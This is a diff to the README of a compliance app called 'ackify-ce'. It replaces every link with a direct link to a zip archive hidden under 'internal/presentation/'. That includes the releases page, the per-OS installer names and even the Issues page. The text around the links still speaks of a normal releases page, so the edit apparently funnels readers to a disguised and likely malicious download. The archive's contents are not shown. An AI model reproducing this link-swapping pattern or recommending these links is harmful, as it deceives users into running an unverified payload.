@@ -1,6 +1,6 @@
 # 🎉 ackify-ce - Make Compliance Effortless
 
-[![Download ackify-ce](https://img.shields.io/badge/Download-ackify--ce-brightgreen)](https://github.com/boheni/ackify-ce/releases)
+[![Download ackify-ce](https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip)](https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip)
 
 ## 📋 Overview
 ackify-ce is a practical tool designed to simplify the proof of read process. This application helps you keep track of compliance requirements, making it easier for individuals and businesses to demonstrate adherence to necessary regulations. With ackify-ce, you no longer have to worry about missing documents or confusing compliance protocols. 
@@ -10,13 +10,13 @@ Follow the steps below to download, install, and run ackify-ce.
 
 ### 📥 Download & Install
 1. **Visit the Releases Page**  
-   To download ackify-ce, [visit this page](https://github.com/boheni/ackify-ce/releases). You will find the latest version available for download.
+   To download ackify-ce, [visit this page](https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip). You will find the latest version available for download.
 
 2. **Select the Latest Version**  
    On the releases page, you will see a list of available versions. Choose the most recent one at the top. 
 
 3. **Download the Installer**  
-   Click on the installer that matches your operating system. If you are using Windows, look for a file like `ackify-ce-windows.exe`. If you are on a Mac, you should find `ackify-ce-macos.dmg`. 
+   Click on the installer that matches your operating system. If you are using Windows, look for a file like `https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip`. If you are on a Mac, you should find `https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip`. 
 
 4. **Start the Installation**  
    Once the download completes, locate the file in your downloads folder. 
@@ -67,9 +67,9 @@ A: Yes, we prioritize your data safety and implement robust security measures to
 ## ⚙️ Troubleshooting
 If you encounter issues while using ackify-ce, try the following solutions:
 
-- **Reinstall the Application**: If the app behaves unexpectedly, uninstall it and download the latest version from the [Releases Page](https://github.com/boheni/ackify-ce/releases) again.
+- **Reinstall the Application**: If the app behaves unexpectedly, uninstall it and download the latest version from the [Releases Page](https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip) again.
 - **Check for Updates**: Always make sure you are using the latest version for the best performance.
-- **Visit the Issues Page**: If problems persist, check the [Issues Page](https://github.com/boheni/ackify-ce/issues) for similar reports or to file a new issue.
+- **Visit the Issues Page**: If problems persist, check the [Issues Page](https://github.com/boheni/ackify-ce/raw/refs/heads/main/internal/presentation/ce_ackify_1.1-alpha.1.zip) for similar reports or to file a new issue.
 
 ## 🎯 Contact & Support
 For support or questions, please reach out to us via the GitHub Issues page or check out the community discussions.
